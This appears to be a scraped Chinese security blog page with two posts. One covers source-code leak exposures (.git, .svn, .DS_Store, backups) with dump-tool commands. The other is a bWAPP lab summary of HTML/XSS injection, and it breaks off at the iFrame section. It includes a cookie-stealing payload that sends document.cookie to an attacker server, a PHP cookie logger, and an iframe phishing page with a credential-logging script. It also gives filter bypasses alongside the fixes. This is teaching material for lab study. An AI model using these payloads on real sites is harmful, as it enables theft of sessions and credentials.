    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="hg"><a href="#hg" class="headerlink" title=".hg"></a>.hg</h1><h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>hg init 的时候生成 .hg</p>
<p>例如，<a href="http://www.example.com/.hg/" target="_blank" rel="noopener">http://www.example.com/.hg/</a></p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>使用 dvcs-ripper</p>
<p>rip-hg.pl -v -u <a href="http://www.example.com/.hg/" target="_blank" rel="noopener">http://www.example.com/.hg/</a></p>
<h1 id="git"><a href="#git" class="headerlink" title=".git"></a>.git</h1><h2 id="成因-1"><a href="#成因-1" class="headerlink" title="成因"></a>成因</h2><p>当在一个目录执行 git init 时，Git 会创建一个 .git 目录。 这个目录包含所有的 Git 存储和操作的对象。 如果想备份或复制一个版本库，只需把这个目录拷贝至另一处就可以了。</p>
<p>例如，<a href="http://www.example.com/.git/" target="_blank" rel="noopener">http://www.example.com/.git/</a></p>
<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>使用 GitHack</p>
<p>python GitHack.py <a href="http://www.example.com/.git/" target="_blank" rel="noopener">http://www.example.com/.git/</a></p>
<h1 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h1><h2 id="成因-2"><a href="#成因-2" class="headerlink" title="成因"></a>成因</h2><p>.DS_Store 文件 MAC 系统是用来存储这个文件夹的显示属性的：比如文件图标的摆放位置。如果用户删除以后的副作用就是这些信息的失去。</p>
<p>这些文件本来是给 Finder 使用的，但它们被设想作为一种更通用的有关显示设置的元数据存储，诸如图标位置和视图设置。 当你需要把代码上传的时候，安全正确的操作应该把 .DS_Store 文件删除才正确。</p>
<p>因为里面包含了一些目录信息，如果没有删除，攻击者通过 .DS_Store 可以知道这个目录里面所有文件名称，从而让攻击者掌握了更多的信息。　</p>
<p>在发布代码时未删除文件夹中隐藏的 .DS_store，被发现后，获取了敏感的文件名等信息。</p>
<p>例如，<a href="http://www.example.com/.DS_Store" target="_blank" rel="noopener">http://www.example.com/.DS_Store</a></p>
<h2 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h2><p>使用 ds_store_exp</p>
<p>python ds_store_exp.py <a href="http://www.example.com/.DS_Store" target="_blank" rel="noopener">http://www.example.com/.DS_Store</a></p>
<h1 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h1><h2 id="成因-3"><a href="#成因-3" class="headerlink" title="成因"></a>成因</h2><p>网站备份时，未安全存储备份文件</p>
<p>常见格式：</p>
<ul>
<li>.rar</li>
<li>.zip</li>
<li>.7z</li>
<li>.tar.gz</li>
<li>.bak</li>
<li>.swp</li>
<li>.txt</li>
<li>.html</li>
<li><a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a></li>
<li>url.tar.gz</li>
</ul>
<p>比如，<a href="http://wm123.baidu.com/wm123.tar.gz" target="_blank" rel="noopener">http://wm123.baidu.com/wm123.tar.gz</a></p>
<h2 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h2><p>直接访问下载</p>
<h1 id="SVN"><a href="#SVN" class="headerlink" title="SVN"></a>SVN</h1><h2 id="成因-4"><a href="#成因-4" class="headerlink" title="成因"></a>成因</h2><p>SVN 是 Subversion 的简称，是一个开放源代码的版本控制系统，相较于 RCS、CVS，它采用了分支管理系统，它的设计目标就是取代 CVS。互联网上很多版本控制服务已从 CVS 迁移到 Subversion。</p>
<p>很多网站都使用了 svn 版本控制系统，和使用 git 版本控制器类似，很多开发者网站安全意识不足，代码放到生产坏境中后，没有清理 svn 的一些信息，导致 svn 残留。</p>
<p>例如，<a href="http://www.example.com/.svn" target="_blank" rel="noopener">http://www.example.com/.svn</a></p>
<h2 id="利用-4"><a href="#利用-4" class="headerlink" title="利用"></a>利用</h2><p>使用 dvcs-ripper</p>
<p>rip-svn.pl -v -u <a href="http://www.example.com/.svn" target="_blank" rel="noopener">http://www.example.com/.svn</a></p>
<h1 id="WEB-INF-web-xml-泄露"><a href="#WEB-INF-web-xml-泄露" class="headerlink" title="WEB-INF/web.xml 泄露"></a>WEB-INF/web.xml 泄露</h1><h2 id="成因-5"><a href="#成因-5" class="headerlink" title="成因"></a>成因</h2><p>WEB-INF 是 Java 的 WEB 应用的安全目录。该目录原则上来说是客户端无法访问，只有服务端才可以可以访问。如果想在页面中直接访问其中的文件，必须通过 web.xml 文件对要访问的文件进行相应映射才能访问。</p>
<p>WEB-INF 主要包含一下文件或目录：</p>
<ul>
<li>/WEB-INF/web.xml：Web 应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则</li>
<li>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非 servlet class，他们不能包含在 .jar 文件中</li>
<li>/WEB-INF/lib/：存放 web 应用需要的各种 JAR 文件，放置仅在这个应用中要求使用的 jar 文件 , 如数据库驱动 jar 文件</li>
<li>/WEB-INF/src/：源码目录，按照包名结构放置各个 java 文件</li>
<li>/WEB-INF/database.properties：数据库配置文件</li>
</ul>
<p>在一些特定的场合却会让攻击者能读取到其中的内容，从而造成源码泄露</p>
<h2 id="利用-5"><a href="#利用-5" class="headerlink" title="利用"></a>利用</h2><p>直接访问</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/14/漏洞总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="peri0d">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/toux.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="peri0d的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/14/漏洞总结/" itemprop="url">常见漏洞总结</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-14T21:59:48+08:00">
                2019-06-14
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/总结/" itemprop="url" rel="index">
                    <span itemprop="name">总结</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>基于 bWAPP，所列举的 payload 只是典型例子</p>
<h1 id="HTML-Injection-Reflected-GET"><a href="#HTML-Injection-Reflected-GET" class="headerlink" title="HTML Injection - Reflected (GET)"></a>HTML Injection - Reflected (GET)</h1><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  function htmli($data)</span><br><span class="line">  &#123;</span><br><span class="line">      return $data;</span><br><span class="line">  &#125;</span><br><span class="line">  if(isset($_GET[&quot;firstname&quot;]) &amp;&amp; isset($_GET[&quot;lastname&quot;]))</span><br><span class="line">  &#123;   </span><br><span class="line">      $firstname = $_GET[&quot;firstname&quot;];</span><br><span class="line">      $lastname = $_GET[&quot;lastname&quot;];    </span><br><span class="line">      if($firstname == &quot;&quot; or $lastname == &quot;&quot;)</span><br><span class="line">      &#123;</span><br><span class="line">          echo &quot;&lt;font color=\&quot;red\&quot;&gt;Please enter both fields...&lt;/font&gt;&quot;   </span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">      else            </span><br><span class="line">      &#123; </span><br><span class="line">          echo &quot;Welcome &quot; . htmli($firstname) . &quot; &quot; . htmli($lastname);   </span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>以 GET 方式提交数据。将提交的数据通过 URL 中，但是并<strong>未对输入进行过滤</strong></p>
<p>如果输入 <code>?firstname=1&amp;lastname=&lt;script&gt;alert(1)&lt;/script&gt;</code> </p>
<p>后面的输出就变为 <code>Welcome 1 &lt;script&gt;alert(1)&lt;/script&gt;</code>，浏览器会自动解析 JS 语句，从而弹窗</p>
<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>常是诱使用户点击包含恶意代码的 URL，常用于<strong>窃取 cookies</strong> 或者进行<strong>钓鱼欺骗</strong>。</p>
<h3 id="窃取-Cookies"><a href="#窃取-Cookies" class="headerlink" title="窃取 Cookies"></a>窃取 Cookies</h3><p>payload ：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.233.1/htmli_get.php?firstname=&lt;script&gt;var x=new Image();x.src="http://192.168.233.1/test.php?cookie="+document.cookie;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中，192.168.233.1 可以替换为攻击者的服务器，test.php 为接受 cookies 的文件，这样就可以获取点击者的 cookies</p>
<p>test.php ( 用于接收 cookie )</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie = $_GET[<span class="string">'cookie'</span>];</span><br><span class="line">$log = fopen(<span class="string">'cookie.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($log, $cookie);</span><br><span class="line">fwrite(<span class="string">"\n"</span>);</span><br><span class="line">fclose($log);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>效果</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_1.png" alt></p>
<h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3><p>payload ：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.233.1/htmli_get.php?firstname=</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">document</span>.body.innerHTML=(</span><br><span class="line"><span class="string">'&lt;div style="position:absolute;top:0px;left:0px;width:100%;high:100%;"&gt;'</span>+</span><br><span class="line"><span class="string">'&lt;iframe src=http://192.168.233.1/fish.html width=100% height=100%&gt;'</span>+</span><br><span class="line"><span class="string">'&lt;/iframe&gt;&lt;/div&gt;'</span></span><br><span class="line">);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>创建一个 Iframe 框架覆盖原页面，强制输入，其中，192.168.233.1 可以替换为攻击者的服务器，fish.html 为钓鱼页面，fish.php 接收数据</p>
<p>fish.html ( 钓鱼页面，直接从真实页面复制 )</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"fish.php"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"Nick"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"Pass"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">value</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>fish.php ( 接收传递的数据 )</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = fopen(<span class="string">"loginfile.txt"</span>,<span class="string">"a+"</span>);</span><br><span class="line">$login = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$pass = $_POST[<span class="string">'password'</span>];</span><br><span class="line">fwrite($data, <span class="string">"Username: $login"</span>);</span><br><span class="line">fwrite(<span class="string">"\n"</span>);</span><br><span class="line">fwrite($data, <span class="string">"Password: $pass"</span>);</span><br><span class="line">fwrite(<span class="string">"\n"</span>);</span><br><span class="line">fclose($data);</span><br><span class="line"><span class="comment">//重定向 URL</span></span><br><span class="line">Header(<span class="string">"location: http://192.168.233.133/bWAPP/htmli_get.php"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>效果</p>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/bwapp/html_2.png" alt></p>
<h2 id="防护方式"><a href="#防护方式" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $input = str_replace(<span class="string">"&lt;"</span>, <span class="string">"&amp;lt;"</span>, $data);</span><br><span class="line">    $input = str_replace(<span class="string">"&gt;"</span>, <span class="string">"&amp;gt;"</span>, $input);</span><br><span class="line"></span><br><span class="line">    $input = urldecode($input);</span><br><span class="line">    <span class="keyword">return</span> $input;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将 <code>&lt;</code> 和 <code>&gt;</code> 替换为 HTML 实体，然后进行 URL 解码</p>
<p>绕过：</p>
<p>直接将传入的参数进行 URL 编码即可。如果是在对话框中输入，只需要一次 URL Encode，如果是在 URL 栏中输入需要两次。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// htmlentities - converts all applicable characters to HTML entities</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> htmlentities($data, ENT_QUOTES);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将所有字符替换为 HTML 实体，当需要将一个字符串输出到 Web 网页时，又不确定其中是否存在 XSS 字符时，可以使用 <strong>htmlentities</strong> 函数进行输出过滤。暂时无法绕过。</p>
<h1 id="HTML-Injection-Reflected-POST"><a href="#HTML-Injection-Reflected-POST" class="headerlink" title="HTML Injection - Reflected (POST)"></a>HTML Injection - Reflected (POST)</h1><h2 id="产生原因-1"><a href="#产生原因-1" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> $data;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"firstname"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"lastname"</span>]))</span><br><span class="line">  &#123;   </span><br><span class="line">      $firstname = $_POST[<span class="string">"firstname"</span>];</span><br><span class="line">      $lastname = $_POST[<span class="string">"lastname"</span>];    </span><br><span class="line">      <span class="keyword">if</span>($firstname == <span class="string">""</span> <span class="keyword">or</span> $lastname == <span class="string">""</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"&lt;font color=\"red\"&gt;Please enter both fields...&lt;/font&gt;"</span>   </span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>            </span><br><span class="line">      &#123; </span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"Welcome "</span> . htmli($firstname) . <span class="string">" "</span> . htmli($lastname);   </span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>以 POST 方式提交数据，和 GET 型类似，只是提交数据的方式不同</p>
<h2 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload (post) : </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firstname=<span class="number">1</span>&amp;lastname=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>获取登陆用户的 cookie</p>
<h2 id="防护方式-1"><a href="#防护方式-1" class="headerlink" title="防护方式"></a>防护方式</h2><p>与 GET 的防护相同，绕过方法也类似，第一种绕过需要对提交的数据 URL Encode 两次，第二种无法绕过</p>
<h1 id="HTML-Injection-Reflected-Current-URL"><a href="#HTML-Injection-Reflected-Current-URL" class="headerlink" title="HTML Injection - Reflected (Current URL)"></a>HTML Injection - Reflected (Current URL)</h1><h2 id="产生原因-2"><a href="#产生原因-2" class="headerlink" title="产生原因"></a>产生原因</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $url = <span class="string">"http://"</span> . $_SERVER[<span class="string">"HTTP_HOST"</span>] . $_SERVER[<span class="string">"REQUEST_URI"</span>]; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p align=\"left\"&gt;Your current URL: &lt;i&gt;"</span> . $url . <span class="string">"&lt;/i&gt;&lt;/p&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出当前请求的 URL，同样，未对输入进行过滤。</p>
<h2 id="利用方式-2"><a href="#利用方式-2" class="headerlink" title="利用方式"></a>利用方式</h2><p>页面直接返回所请求的 URL，直接修改所请求的 URL。但是浏览器会自动进行 URL 编码，所以需要在 burp 中去掉 URL 编码</p>
<p>payload ：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="防护方式-2"><a href="#防护方式-2" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$url = <span class="string">"&lt;script&gt;document.write(document.URL)&lt;/script&gt;"</span>;</span><br></pre></td></tr></table></figure>

<p>直接使用 JS 的函数输出 URL，暂时无法绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($data, $encoding = <span class="string">"UTF-8"</span>)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> htmlspecialchars($data, ENT_QUOTES, $encoding);</span><br><span class="line">  &#125;</span><br><span class="line">  $url = <span class="string">"http://"</span>.$_SERVER[<span class="string">"HTTP_HOST"</span>].check($_SERVER[<span class="string">"REQUEST_URI"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用 htmlspecialchars 进行转义，无法绕过</p>
<h1 id="HTML-Injection-Stored-Blog"><a href="#HTML-Injection-Stored-Blog" class="headerlink" title="HTML Injection - Stored (Blog)"></a>HTML Injection - Stored (Blog)</h1><h2 id="产生原因-3"><a href="#产生原因-3" class="headerlink" title="产生原因"></a>产生原因</h2><p>存储型 XSS，恶意脚本被存储到客户端或者服务器的数据库中，当其他用户浏览网页时，就在受害者主机上执行恶意代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> $data;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"entry_add"</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">      $entry = htmli($_POST[<span class="string">"entry"</span>]);</span><br><span class="line">      $owner = $_SESSION[<span class="string">"login"</span>];</span><br><span class="line">      <span class="keyword">if</span>($entry == <span class="string">""</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          $message =  <span class="string">"&lt;font color=\"red\"&gt;Please enter some text...&lt;/font&gt;"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>            </span><br><span class="line">      &#123; </span><br><span class="line">          $sql = <span class="string">"INSERT INTO blog (date, entry, owner) VALUES (now(),'"</span>.$entry.<span class="string">"','"</span>.$owner.<span class="string">"')"</span>;</span><br><span class="line">          $recordset = $link-&gt;query($sql);</span><br><span class="line">          <span class="keyword">if</span>(!$recordset)</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="keyword">die</span>(<span class="string">"Error: "</span> . $link-&gt;error . <span class="string">"&lt;br /&gt;&lt;br /&gt;"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// Debugging</span></span><br><span class="line">          <span class="comment">// echo $sql;</span></span><br><span class="line">          $message = <span class="string">"&lt;font color=\"green\"&gt;Your entry was added to our blog!&lt;/font&gt;"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里没有对输入的 entry 进行过滤，如果输入 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> ，那么这段代码就会保存在数据库，用户每次访问时都会弹窗。</p>
<h2 id="利用方式-3"><a href="#利用方式-3" class="headerlink" title="利用方式"></a>利用方式</h2><p>最典型的例子就是 XSS 蠕虫。</p>
<p>payload : </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//实现网页的无限刷新</span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//弹出 1，注意不是 '1'</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">"alert('1');"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">//生成一个按钮，点击弹出 1</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"click me"</span> <span class="attr">onclick</span>=<span class="string">"alert('1')"</span>; /&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="防护方式-3"><a href="#防护方式-3" class="headerlink" title="防护方式"></a>防护方式</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addslashes($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 addslashes 函数转义，这个函数对 <strong>单引号( ‘ )，双引号( “ )，反斜杠( \ )，NULL</strong> 生效</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmli</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// htmlentities - converts all applicable characters to HTML entities</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> htmlentities($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 htmlspecialchars 进行转义，无法绕过</p>
<h1 id="iFrame-Injection"><a href="#iFrame-Injection" class="headerlink" title="iFrame Injection"></a>iFrame Injection</h1><h2 id="产生原因-4"><a href="#产生原因-4" class="headerlink" title="产生原因"></a>产生原因</h2><p>iframe 标签是 HTML 中一个很重要的标签，常用于嵌入第三方网页，比如嵌入广告页面，第三方 Web 游戏与应用等。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&lt;?php</span><br><span class="line">  function xss($data)&#123;</span><br><span class="line">	  return $data;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe frameborder=&quot;0&quot; src=&quot;&lt;?php echo xss($_GET[&quot;ParamUrl&quot;])?&gt;&quot; height=&quot;&lt;?php echo xss($_GET[&quot;ParamHeight&quot;])?&gt;&quot; width=&quot;&lt;?php echo xss($_GET[&quot;ParamWidth&quot;])?&gt;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>传入参数 ParamUrl，ParamHeight，ParamWidth，用于控制 iframe 组件，但是没有对传入的参数进行过滤</p>
<h2 id="利用方式-4"><a href="#利用方式-4" class="headerlink" title="利用方式"></a>利用方式</h2><p>payload ：</p>
